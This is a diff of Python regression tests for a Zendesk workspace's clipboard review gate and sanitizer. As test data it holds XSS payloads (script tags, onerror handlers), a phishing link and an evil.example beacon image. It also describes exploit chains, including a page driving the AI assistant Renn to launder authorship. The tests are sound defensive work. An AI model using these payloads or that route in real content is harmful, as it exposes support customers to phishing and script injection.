@@ -14,7 +14,38 @@ Load-bearing invariants locked here:
   (drafts included — draft rich copies pass sanitize_html too);
 * js_save_draft is RENAME-ONLY (article {title}; macro {name, description})
   and the review diff is computed over the clipboard projection
-  (html_to_text(body_html) when set), so reviewed == copied always;
+  (html_to_review_text(body_html) when set), so reviewed == copied always;
+* THE CLIPBOARD INVARIANT — whatever reaches the clipboard is
+  byte-identical to something the reviewer was shown, and nothing can be
+  present in the copied bytes without being present in the reviewed
+  material. Locked here as: the authoritative review is a SOURCE diff of
+  the exact bytes (readable projection served only as a labelled SECONDARY
+  view); the clipboard gate hash-binds every released string (plain AND
+  text/html mime flavour) to a recorded review, for DRAFTS and MIRROR rows
+  alike, on top of a recompute-from-row content hash; verbatim pull bytes
+  are announced, never hidden; a zero-change source diff over differing
+  bytes is a surfaced warning; and every content mutation (including an
+  out-of-band one) drops the record. The six confirmed exploit variants
+  each have a dedicated end-to-end regression below;
+* THE UNIVERSAL DRAFT-COPY CONFIRM — every clipboard release of DRAFT
+  content (article draft or macro draft, every field, both mime flavours)
+  takes a NATIVE confirm that DISPLAYS THE EXACT BYTES; absent, declined,
+  or bytes that moved under the dialog ⇒ no clipboard write and no
+  copy_resolved receipt. MIRROR rows keep the review-record gate alone.
+  This REPLACED a provenance ledger that tried to gate only page-authored
+  bytes; E1 (a partial macro write losing the stamp) and E2 (authorship
+  laundering — the page drives Renn through the co-registered chat bridge)
+  both have regressions below, as does the ledger's absence;
+* the PREVIEW sanitize profile is additive and rendering-only: the preview
+  keeps presentational markup so pulled articles render faithfully and the
+  markup notice stays rare, while the clipboard and stored content keep the
+  strict profile;
+* js_save_body_edit is the ONE content-bearing slot: only the markdown
+  ``body`` payload key is honored, body_html is ALWAYS recomputed
+  Python-side as sanitize_html(markdown_to_html(body)) (smuggled
+  body_html/html/rich keys change nothing beyond the recomputed values),
+  mirror article rows stay byte-identical, and only pending drafts accept
+  edits;
 * search results are served from the FTS hit ids — authoritative and
   complete for the query, never intersected with the 500-row browse slice;
 * the compat surface exists and article_push / macro_push / sync_requested
@@ -37,6 +68,7 @@ from PySide6.QtWidgets import QApplication
 
 import src.services.zendesk_web as zendesk_web
 from src.data import zendesk_store
+from src.data.html_sanitize import sanitize_html
 from src.services.zendesk_web import ZendeskWebController
 from src.ui.web.zendesk_bridge import ZendeskBridge
 
@@ -119,6 +151,47 @@ def _serve_revisions(ctrl, filt="all"):
     ctrl.js_request_revisions(filt)
 
 
+def _review(ctrl, kind, did):
+    """Do what a specialist does before copying a DRAFT: open the source
+    diff. Serving it is what records the review the clipboard gate checks."""
+    ctrl.js_request_diff(kind, str(did))
+
+
+def _review_article(ctrl, aid):
+    """Mirror rows have the same gate: opening the article is what serves
+    the exact source bytes (body_source) and records the review."""
+    ctrl.js_open_article(str(aid))
+
+
+def _review_macro(ctrl, mid):
+    ctrl.js_open_macro(str(mid))
+
+
+def _gated(db, *, answer=True, **kw):
+    """A controller behind a fake NATIVE confirm, page.py-shaped: the real
+    _web_zendesk_confirm takes an optional third `detail` argument (the
+    scrollable QMessageBox detail pane the copy gate puts the exact
+    clipboard bytes in), so the fake must too.
+
+    Every DRAFT copy goes through this dialog, so draft-copy tests build
+    their controller here rather than with the bare `_controller`."""
+    confirms = []
+    def confirm(title, text, detail=None):
+        confirms.append((title, text, detail))
+        if callable(answer):
+            return answer()
+        return answer
+    ctrl, seen = _controller(db, confirm_fn=confirm, **kw)
+    return ctrl, seen, confirms
+
+
+def _confirm_blob(confirms):
+    """Everything the native confirm actually PUT IN FRONT OF THE OPERATOR —
+    title + message + detail pane. The copy gate's contract is that the exact
+    clipboard bytes are in here."""
+    return "\n".join(str(part) for call in confirms for part in call)
+
+
 # ── viewmodel shapes ─────────────────────────────────────────────────
 
 def test_zendesk_data_shape(empty_db):
@@ -192,7 +265,7 @@ def test_article_detail_lists_revisions(empty_db):
     ctrl.js_open_article("101")
     revs = seen["article"][-1]["revisions"]
     assert revs == [{"draft_id": did, "status": "pending",
-                     "title": "SSO (rev)",
+                     "title": "SSO (rev)", "source_ref": None,
                      "updated_display": revs[0]["updated_display"]}]
 
 
@@ -489,7 +562,8 @@ def test_diff_reviews_what_the_clipboard_delivers(empty_db):
         article_id=101, body_html="<p>DIVERGENT clipboard payload</p>",
         rationale="r")
     calls = []
-    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
     _serve_revisions(ctrl)
     ctrl.js_request_diff("article", str(did))
     added = " ".join(r["text"] for r in seen["diffs"][-1]["rows"]
@@ -538,6 +612,252 @@ def test_mark_ready_and_copied_db_state_validation(empty_db):
     ctrl.js_mark_copied("bogus-kind", str(d2))
 
 
+# ── specialist body edits (js_save_body_edit; articles only, v1) ─────
+#
+# The one content-bearing slot. Safe ONLY because of the recompute
+# invariant (closes review finding C1's class): the payload's markdown
+# `body` key is the single honored input and body_html is ALWAYS
+# recomputed Python-side as sanitize_html(markdown_to_html(body)) — so the
+# reviewed diff, the stored body_html, and the clipboard copy can never
+# diverge, and mirror article rows are never touched.
+
+def _rendered(body):
+    from src.data.html_markdown import markdown_to_html
+    from src.data.html_sanitize import sanitize_html
+    return sanitize_html(markdown_to_html(body))
+
+
+def test_body_edit_pending_draft_updates_and_recomputes(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="old", article_id=101,
+        body_html="<p>old</p>", rationale="r")
+    ctrl, seen = _controller(empty_db)
+    _serve_revisions(ctrl)
+    ctrl.js_save_body_edit("draft", str(did), json.dumps(
+        {"body": "New **bold** steps"}))
+    d = zendesk_store.get_article_draft(conn, did)
+    assert d["body"] == "New **bold** steps"
+    assert d["body_html"] == _rendered("New **bold** steps")
+    assert "<strong>bold</strong>" in d["body_html"]
+    res = seen["actions"][-1]
+    assert res["action"] == "body_edit" and res["ok"] is True
+    assert res["kind"] == "article" and res["draft_id"] == did
+    assert res["target"] == "draft" and res["error"] is None
+    # revisions re-pushed (last filter) with the additive source_ref key
+    row = next(r for r in seen["revisions"][-1]["revisions"]
+               if r["draft_id"] == did)
+    assert "source_ref" in row and row["source_ref"] is None
+    # no article detail is open → no detail re-push
+    assert seen["article"] == []
+
+
+def test_body_edit_smuggled_html_keys_change_nothing_beyond_recompute(empty_db):
+    """C1-class regression: a payload smuggling body_html/html/rich (or
+    status/provenance) keys changes NOTHING beyond the recomputed values —
+    the page can never supply HTML, and a hostile markdown body cannot
+    land live markup because the recompute passes sanitize_html."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="old", article_id=101, rationale="r")
+    ctrl, seen = _controller(empty_db)
+    _serve_revisions(ctrl)
+    hostile_md = ("Fine paragraph.\n\n<script>evil()</script>"
+                  '<img src=x onerror="alert(1)">')
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({
+        "body": hostile_md,
+        "body_html": "<p>SMUGGLED</p><script>x()</script>",
+        "html": "<p>SMUGGLED2</p>", "rich": "<b>SMUGGLED3</b>",
+        "status": "copied", "title": "forged", "rationale": "forged",
+        "sources_json": "[]"}))
+    d = zendesk_store.get_article_draft(conn, did)
+    assert d["body"] == hostile_md
+    assert d["body_html"] == _rendered(hostile_md)     # recomputed, only
+    assert "SMUGGLED" not in d["body_html"]
+    assert "<script" not in d["body_html"].lower()
+    assert "onerror" not in d["body_html"].lower()
+    assert d["status"] == "pending" and d["title"] == "T"
+    assert d["rationale"] == "r"
+    assert seen["actions"][-1]["ok"] is True
+
+
+def test_body_edit_diff_reflects_clipboard_projection(empty_db):
+    """After an edit, the reviewed diff and the clipboard bytes both come
+    from the recomputed body_html — reviewed == copied, always.
+
+    The copy also crosses the universal draft-copy confirm — approved here;
+    the refusal branches live in the draft-copy section below."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="Setting up SSO", body="stale", article_id=101,
+        body_html="<p>stale</p>", rationale="r")
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
+    _serve_revisions(ctrl)
+    ctrl.js_save_body_edit("draft", str(did), json.dumps(
+        {"body": "Completely fresh wording here"}))
+    ctrl.js_request_diff("article", str(did))
+    added = " ".join(r["text"] for r in seen["diffs"][-1]["rows"]
+                     if r["tag"] == "add")
+    assert "fresh wording" in added
+    assert "stale" not in added
+    zendesk_store.set_draft_status(conn, "article", did, "ready")
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
+    assert calls[-1][0] == stored
+    assert stored == _rendered("Completely fresh wording here")
+    assert stored in _confirm_blob(confirms)
+
+
+def test_body_edit_nonpending_draft_refused_with_status_text(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="B", article_id=101,
+        body_html="<p>B</p>", rationale="r")
+    ctrl, seen = _controller(empty_db)
+    _serve_revisions(ctrl)
+    zendesk_store.set_draft_status(conn, "article", did, "ready")
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
+    d = zendesk_store.get_article_draft(conn, did)
+    assert d["body"] == "B" and d["body_html"] == "<p>B</p>"
+    assert seen["actions"] == []                       # silent no-op
+    assert seen["status"] and "ready" in seen["status"][-1]
+    zendesk_store.set_draft_status(conn, "article", did, "copied")
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
+    d = zendesk_store.get_article_draft(conn, did)
+    assert d["body"] == "B" and d["body_html"] == "<p>B</p>"
+    assert seen["actions"] == []
+    assert "copied" in seen["status"][-1]
+
+
+def test_body_edit_article_creates_specialist_draft_mirror_untouched(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_open_article("101")
+    n_details = len(seen["article"])
+    before = dict(conn.execute(
+        "SELECT * FROM zendesk_articles WHERE article_id=101").fetchone())
+    ctrl.js_save_body_edit("article", "101", json.dumps(
+        {"body": "Edited body"}))
+    after = dict(conn.execute(
+        "SELECT * FROM zendesk_articles WHERE article_id=101").fetchone())
+    assert after == before                 # mirror row byte-identical
+    drafts = [dict(r) for r in conn.execute(
+        "SELECT * FROM zendesk_article_drafts").fetchall()]
+    assert len(drafts) == 1
+    d = drafts[0]
+    assert d["article_id"] == 101 and d["status"] == "pending"
+    assert d["source_ref"] == "specialist-edit"
+    assert d["rationale"] == "Edited in the workspace."
+    assert d["title"] == "Setting up SSO"  # article title, per contract
+    assert d["body"] == "Edited body"
+    assert d["body_html"] == _rendered("Edited body")
+    res = seen["actions"][-1]
+    assert res["action"] == "body_edit" and res["ok"] is True
+    assert res["kind"] == "article" and res["target"] == "article"
+    assert res["draft_id"] == d["id"]
+    # the open article's detail is re-pushed, now listing the revision
+    assert len(seen["article"]) == n_details + 1
+    revs = seen["article"][-1]["revisions"]
+    assert [r["draft_id"] for r in revs] == [d["id"]]
+    assert revs[0]["source_ref"] == "specialist-edit"
+    # revisions re-push carries the origin distinction for the UI tag
+    row = seen["revisions"][-1]["revisions"][0]
+    assert row["source_ref"] == "specialist-edit"
+
+
+def test_body_edit_article_reuses_open_specialist_draft(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    renn = zendesk_store.save_article_draft(
+        conn, title="Renn rev", body="renn body", article_id=101,
+        source_ref="doc:42", rationale="stale steps")
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_open_article("101")
+    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "first"}))
+    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "second"}))
+    rows = [dict(r) for r in conn.execute(
+        "SELECT * FROM zendesk_article_drafts "
+        "WHERE source_ref='specialist-edit'").fetchall()]
+    assert len(rows) == 1                  # second edit reused the draft
+    assert rows[0]["body"] == "second"
+    assert rows[0]["body_html"] == _rendered("second")
+    # the Renn proposal targeting the same article is never touched
+    r = zendesk_store.get_article_draft(conn, renn)
+    assert r["body"] == "renn body" and r["source_ref"] == "doc:42"
+    # a specialist draft that moved past pending is NOT reused
+    zendesk_store.set_draft_status(conn, "article", rows[0]["id"], "ready")
+    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "third"}))
+    rows = [dict(r) for r in conn.execute(
+        "SELECT * FROM zendesk_article_drafts "
+        "WHERE source_ref='specialist-edit' ORDER BY id").fetchall()]
+    assert [r["status"] for r in rows] == ["ready", "pending"]
+    assert rows[0]["body"] == "second"     # the reviewed draft is frozen
+    assert rows[1]["body"] == "third"
+
+
+def test_body_edit_forged_stale_malformed_silent(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="B", article_id=101, rationale="r")
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_refresh()                      # serves the article ids
+    _serve_revisions(ctrl)
+    body_ok = json.dumps({"body": "x"})
+    ctrl.js_save_body_edit("bogus", "101", body_ok)     # kind allowlist
+    ctrl.js_save_body_edit("article", "9999", body_ok)  # never served
+    ctrl.js_save_body_edit("article", "abc", body_ok)   # malformed id
+    ctrl.js_save_body_edit("draft", "999", body_ok)     # unserved draft id
+    ctrl.js_save_body_edit("draft", str(did), "{not json")
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": 5}))
+    ctrl.js_save_body_edit("draft", str(did),
+                           json.dumps({"body_html": "<p>x</p>"}))  # no body
+    ctrl.js_save_body_edit("draft", str(did), json.dumps(["body"]))
+    # served-then-deleted article (stale) → silent too
+    conn.execute("DELETE FROM zendesk_articles WHERE article_id=102")
+    ctrl.js_save_body_edit("article", "102", body_ok)
+    assert zendesk_store.get_article_draft(conn, did)["body"] == "B"
+    assert conn.execute(
+        "SELECT COUNT(*) FROM zendesk_article_drafts").fetchone()[0] == 1
+    assert seen["actions"] == [] and seen["status"] == []
+
+
+def test_body_edit_frozen_while_pull_inflight(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="B", article_id=101, rationale="r")
+    ctrl, seen = _controller(empty_db, pull_runner=lambda: True)
+    _serve_revisions(ctrl)
+    ctrl.js_request_pull()
+    assert ctrl._pull_inflight is True
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
+    assert zendesk_store.get_article_draft(conn, did)["body"] == "B"
+    assert seen["actions"] == []
+    ctrl.notify_pull_done({"ok": True})
+
+
+def test_body_edit_body_capped_at_200k(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="B", article_id=101, rationale="r")
+    ctrl, seen = _controller(empty_db)
+    _serve_revisions(ctrl)
+    ctrl.js_save_body_edit("draft", str(did),
+                           json.dumps({"body": "a" * 200_001}))
+    d = zendesk_store.get_article_draft(conn, did)
+    assert d["body"] == "a" * 200_000
+    assert seen["actions"][-1]["ok"] is True
+
+
 # ── copy exact ───────────────────────────────────────────────────────
 
 def _clipboard(calls):
@@ -552,6 +872,7 @@ def test_copy_article_reads_exact_db_bytes_and_announces(empty_db):
     calls = []
     ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
     ctrl.js_refresh()                              # serves article ids
+    _review_article(ctrl, 101)                     # records the review
     ctrl.js_copy_field("article", "101", "body_html")
     raw = "<h2>Steps</h2><p>Log into the admin console.</p>"
     assert calls == [(raw, None)]
@@ -577,12 +898,18 @@ def test_copy_target_kind_disambiguation(empty_db):
     assert did == 1                                # collides with article id
     zendesk_store.set_draft_status(conn, "article", did, "ready")
     calls = []
-    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
     ctrl.js_refresh()
     _serve_revisions(ctrl)
+    _review_article(ctrl, 1)
+    _review(ctrl, "article", did)
     ctrl.js_copy_field("article", "1", "title")
     ctrl.js_copy_field("article_draft", "1", "title")
     assert calls == [("Mirror article", None), ("Draft one", None)]
+    # ...and only the DRAFT one took a confirm (mirror rows keep the
+    # review-record gate alone)
+    assert len(confirms) == 1 and "Draft one" in _confirm_blob(confirms)
 
 
 def test_copy_pending_draft_refused_ready_allowed(empty_db):
@@ -591,47 +918,83 @@ def test_copy_pending_draft_refused_ready_allowed(empty_db):
     did = zendesk_store.save_article_draft(
         conn, title="T", body="**bold** body", article_id=101, rationale="r")
     calls = []
-    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
     _serve_revisions(ctrl)
+    _review(ctrl, "article", did)
     ctrl.js_copy_field("article_draft", str(did), "body_html")
     assert calls == [] and seen["copies"] == []    # pending → silent refusal
     zendesk_store.set_draft_status(conn, "article", did, "ready")
+    # marking ready does NOT invalidate the review (content is unchanged)
     ctrl.js_copy_field("article_draft", str(did), "body_html")
     assert len(calls) == 1
     assert "bold" in calls[0][0] and "**" not in calls[0][0]  # rendered md
 
 
-def test_copy_body_rich_import_origin_sanitized(empty_db):
+def test_import_origin_stores_sanitized_bytes(empty_db):
+    """Store-boundary sanitize (variant 3's root cause): an imported body is
+    reduced to the renderable allowlist AT THE WRITE, so the bytes on the
+    clipboard are the bytes the preview displays — no notice, nothing to
+    hide. The old behaviour stored the raw file bytes and defanged only the
+    rich mime flavour."""
     conn = empty_db.conn
     zendesk_store.upsert_articles(conn, [
         {"id": 301, "title": "Imported", "body_html": HOSTILE_HTML,
          "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
         source_file="C:/tmp/x.html")
+    stored = zendesk_store.get_article(conn, 301)["body_html"]
+    assert "<script" not in stored.lower()
+    assert "onerror" not in stored.lower()
+    assert "javascript:" not in stored.lower()
+    assert stored == sanitize_html(stored)         # fixed point
     calls = []
     ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
     ctrl.js_refresh()
-    # plain body_html copy: byte-verbatim for every origin
+    _review_article(ctrl, 301)
+    assert seen["article"][-1]["markup_notice"] == ""
     ctrl.js_copy_field("article", "301", "body_html")
-    assert calls[-1] == (HOSTILE_HTML, None)
-    assert seen["copies"][-1]["sanitized"] is False
-    # rich copy: the text/html mime variant is defanged before the clipboard
+    assert calls[-1] == (stored, None)
     ctrl.js_copy_field("article", "301", "body_rich")
-    text, html = calls[-1]
-    assert text == HOSTILE_HTML                    # plain stays verbatim
-    assert "<script" not in html.lower() and "onerror" not in html.lower()
-    assert seen["copies"][-1]["sanitized"] is True
-    assert "sanitized" in seen["status"][-1]
+    assert calls[-1] == (stored, stored)
+    assert seen["copies"][-1]["sanitized"] is False
 
 
 def test_copy_pull_origin_body_rich_verbatim(empty_db):
+    """The documented pull exception: pull bytes stay byte-faithful, and the
+    rich mime flavour still passes sanitize_html (mime-laundering guard)."""
     _seed_mirror(empty_db.conn)
     calls = []
     ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
     ctrl.js_refresh()
+    _review_article(ctrl, 101)
     ctrl.js_copy_field("article", "101", "body_rich")
     raw = "<h2>Steps</h2><p>Log into the admin console.</p>"
     assert calls == [(raw, raw)]
     assert seen["copies"][-1]["sanitized"] is False
+
+
+def test_pull_origin_hostile_bytes_are_flagged_not_hidden(empty_db):
+    """A pull-origin row keeps bytes the preview cannot display. They are
+    NOT silently rewritten and NOT silently copied: the detail payload
+    carries the exact source plus markup_notice, and the copy announcement
+    repeats the warning on the unforgeable status line."""
+    conn = empty_db.conn
+    zendesk_store.upsert_articles(conn, [
+        {"id": 401, "title": "Pulled", "body_html": HOSTILE_HTML,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    assert zendesk_store.get_article(conn, 401)["body_html"] == HOSTILE_HTML
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_article(ctrl, 401)
+    detail = seen["article"][-1]
+    assert detail["body_source"] == HOSTILE_HTML           # exact bytes shown
+    assert "<script" not in detail["body_srcdoc"].lower()  # preview differs
+    assert "preview does not display" in detail["markup_notice"]
+    ctrl.js_copy_field("article", "401", "body_html")
+    assert calls[-1] == (HOSTILE_HTML, None)
+    assert seen["copies"][-1]["notice"]
+    assert "preview does not display" in seen["status"][-1]
 
 
 def test_copy_draft_body_rich_sanitized(empty_db):
@@ -646,8 +1009,10 @@ def test_copy_draft_body_rich_sanitized(empty_db):
         body_html=HOSTILE_HTML, rationale="r")
     zendesk_store.set_draft_status(conn, "article", did, "ready")
     calls = []
-    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
     _serve_revisions(ctrl)
+    _review(ctrl, "article", did)
     # plain field copy: byte-verbatim, pastes as source text
     ctrl.js_copy_field("article_draft", str(did), "body_html")
     assert calls[-1] == (HOSTILE_HTML, None)
@@ -672,8 +1037,10 @@ def test_copy_clean_draft_body_rich_unflagged(empty_db):
         body_html="<h2>Steps</h2><p>Fine.</p>", rationale="r")
     zendesk_store.set_draft_status(conn, "article", did, "ready")
     calls = []
-    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
     _serve_revisions(ctrl)
+    _review(ctrl, "article", did)
     ctrl.js_copy_field("article_draft", str(did), "body_rich")
     assert calls[-1] == ("<h2>Steps</h2><p>Fine.</p>",
                          "<h2>Steps</h2><p>Fine.</p>")
@@ -685,6 +1052,8 @@ def test_copy_macro_reply_from_either_comment_field(empty_db):
     calls = []
     ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
     ctrl.js_refresh()
+    _review_macro(ctrl, 201)
+    _review_macro(ctrl, 202)
     ctrl.js_copy_field("macro", "201", "macro_reply")   # comment_value
     ctrl.js_copy_field("macro", "202", "macro_reply")   # comment_value_html
     assert [c[0] for c in calls] == ["Hi there", "<p>Hello rich</p>"]
@@ -694,6 +1063,7 @@ def test_copy_forged_targets_and_missing_clipboard(empty_db):
     _seed_mirror(empty_db.conn)
     ctrl, seen = _controller(empty_db)                  # no clipboard_fn
     ctrl.js_refresh()
+    _review_article(ctrl, 101)
     # bad target / field / unserved id → silent
     ctrl.js_copy_field("wallet", "101", "title")
     ctrl.js_copy_field("article", "101", "raw_json")
@@ -705,18 +1075,1487 @@ def test_copy_forged_targets_and_missing_clipboard(empty_db):
     assert seen["status"] == []
 
 
-# ── destructive gates: delete_revision ───────────────────────────────
+# ── the review gate: reviewed bytes == copied bytes ──────────────────
+#
+# A specialist reads a diff and then pastes the copied bytes into live
+# Zendesk by hand, so anything the diff does not display is content the
+# review cannot catch. Three layers, all locked here:
+#   L1 the projection is attribute-VISIBLE (every URL the sanitizer keeps);
+#   L2 draft bytes reach the clipboard only against a CURRENT recorded
+#      review (fail closed — no review, no copy);
+#   L3 every draft-content mutation drops the recorded review.
 
-def _gated(db, *, answer=True, **kw):
-    confirms = []
-    def confirm(title, text):
+PHISH_MD = ("Reset your password from [our secure portal]"
+            "(https://alma-support-reset.example.com/login) today.\n\n"
+            "![](https://evil.example/beacon.gif?u=1)")
+PHISH_HREF = "https://alma-support-reset.example.com/login"
+PHISH_SRC = "https://evil.example/beacon.gif?u=1"
+
+
+def _diff_text(diff):
+    return "\n".join(r["text"] for r in diff["rows"])
+
+
+def test_review_projection_renders_every_url_bearing_attribute():
+    """L1 unit: html_to_text is attribute-BLIND (its contract — it feeds FTS
+    and snippets); html_to_review_text renders the destinations."""
+    html = ('<p>Read <a href="https://good.example/a">the guide</a>.</p>'
+            '<p><img src="https://evil.example/beacon.gif?u=1" alt="pixel">'
+            '</p><p><img src="https://cdn.example/logo.png"></p>')
+    blind = zendesk_store.html_to_text(html)
+    assert "https://" not in blind                  # the defect, as designed
+    seen = zendesk_store.html_to_review_text(html)
+    assert "the guide (https://good.example/a)" in seen
+    assert "[image: pixel (https://evil.example/beacon.gif?u=1)]" in seen
+    assert "[image: https://cdn.example/logo.png]" in seen
+    # degenerate shapes stay lossless and never raise
+    assert zendesk_store.html_to_review_text("") == ""
+    assert zendesk_store.html_to_review_text(
+        '<a href="https://x.example/1">unclosed') == "unclosed (https://x.example/1)"
+    assert zendesk_store.html_to_review_text("<img>") == "[image]"
+    assert zendesk_store.html_to_review_text("<a>bare</a>") == "bare"
+    assert "drop" not in zendesk_store.html_to_review_text(
+        "<script>drop()</script><p>kept</p>")
+
+
+def test_every_sanitizer_allowed_url_attribute_is_covered(empty_db):
+    """Anti-drift guard: the review projection must cover EVERY URL-bearing
+    attribute html_sanitize preserves. If that allowlist grows a new one,
+    this fails instead of silently reopening the review blind spot."""
+    from src.data import html_sanitize as hs
+    allowed = set(hs._GLOBAL_ATTRS)
+    for attrs in hs._TAG_ATTRS.values():
+        allowed |= set(attrs)
+    # every attribute the sanitizer SCHEME-CHECKS is URL-bearing by
+    # definition, and the projection must cover exactly those
+    scheme_checked = {"href", "src"}
+    assert scheme_checked <= allowed
+    assert set(zendesk_store._URL_ATTRS) == scheme_checked & allowed
+    # no other well-known URL-bearing attribute slipped into the allowlist
+    known_url_attrs = {"srcset", "poster", "action", "formaction", "cite",
+                       "background", "longdesc", "usemap", "ping", "data",
+                       "codebase", "profile", "manifest", "xlink:href",
+                       "dynsrc", "lowsrc"}
+    assert not (allowed & known_url_attrs)
+    # style is allowlisted but cannot carry a URL (url(…) is banned and the
+    # value charset excludes ':' and '/'), so it needs no projection
+    assert hs._clean_style("background-color: url(https://evil.example/x)") == ""
+    assert hs._clean_style("color: https://evil.example/x") == ""
+    # and the projection covers each allowed attribute wherever it survives:
+    # href on <a>, src on <img>, plus any future tag carrying either
+    assert zendesk_store.html_to_review_text(
+        '<td src="https://evil.example/x">c</td>') == (
+        "[td src: https://evil.example/x]c")
+    assert zendesk_store.html_to_review_text(
+        '<div href="https://evil.example/y">d</div>') == (
+        "[div href: https://evil.example/y]d")
+
+
+def test_phishing_url_smuggled_past_the_review_is_now_visible(empty_db):
+    """THE EXPLOIT, end to end. Chain executed by the verifier:
+    js_open_article -> js_save_body_edit (markdown carrying a phishing link
+    and a beacon image) -> js_mark_ready -> js_copy_field. The copy path
+    releases body_html BYTE-VERBATIM and the sanitizer deliberately keeps
+    a@href / img@src, so both URLs reached the clipboard while the
+    attribute-blind diff showed the anchor TEXT with no href and no row at
+    all for the image. Now: the URLs are in the diff, the copy is refused
+    until a diff has actually been served, and — because this is DRAFT
+    content — the release additionally needs the native confirm that puts
+    those same bytes in front of a human."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
+    ctrl.js_open_article("101")
+    ctrl.js_save_body_edit("article", "101", json.dumps({"body": PHISH_MD}))
+    did = seen["actions"][-1]["draft_id"]
+    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
+    assert PHISH_HREF in stored and PHISH_SRC in stored   # copy bytes
+
+    # L2: mark_ready then copy, exactly as the exploit did — REFUSED, and
+    # the refusal is announced on the trusted (unforgeable) status line.
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls == [] and seen["copies"] == []
+    assert "not been reviewed" in seen["status"][-1]
+
+    # L1: the reviewer opens the diff — both URLs are on screen now, in the
+    # AUTHORITATIVE source rows (raw markup) and in the secondary readable
+    # projection alike.
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
+    text = _diff_text(diff)
+    assert PHISH_HREF in text
+    assert PHISH_SRC in text
+    added = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")
+    assert f'<a href="{PHISH_HREF}">our secure portal</a>' in added
+    assert f'src="{PHISH_SRC}"' in added
+    projected = "\n".join(r["text"] for r in diff["text_rows"]
+                          if r["tag"] == "add")
+    assert f"our secure portal ({PHISH_HREF})" in projected
+    assert f"[image: {PHISH_SRC}]" in projected
+    # the OLD projection is what hid them (regression anchor)
+    assert PHISH_HREF not in zendesk_store.html_to_text(stored)
+    assert PHISH_SRC not in zendesk_store.html_to_text(stored)
+
+    # legitimate flow: reviewed AND confirmed natively, so the copy now goes
+    # through verbatim — and the confirm carried the exact phishing bytes.
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls[-1] == (stored, None)
+    blob = _confirm_blob(confirms)
+    assert stored in blob and PHISH_HREF in blob and PHISH_SRC in blob
+
+
+def test_diff_baseline_is_projected_the_same_way_as_the_draft(empty_db):
+    """L1 like-for-like: the mirror baseline goes through the review
+    projection too (NOT its stored attribute-blind body_text), so an
+    unchanged link is an 'equal' row and a SWAPPED destination shows up as
+    a real change rather than as identical text."""
+    conn = empty_db.conn
+    zendesk_store.upsert_sections(conn, [{"id": 9, "name": "FAQ"}])
+    zendesk_store.upsert_articles(conn, [
+        {"id": 401, "title": "Reset",
+         "body_html": '<p>Go to <a href="https://help.alma.test/reset">the '
+                      'portal</a>.</p>',
+         "section_id": 9, "updated_at": "2026-07-01T00:00:00Z"}])
+    did = zendesk_store.save_article_draft(
+        conn, title="Reset", body="x", article_id=401, rationale="r",
+        body_html='<p>Go to <a href="https://evil.example/reset">the '
+                  'portal</a>.</p>')
+    ctrl, seen = _controller(empty_db)
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
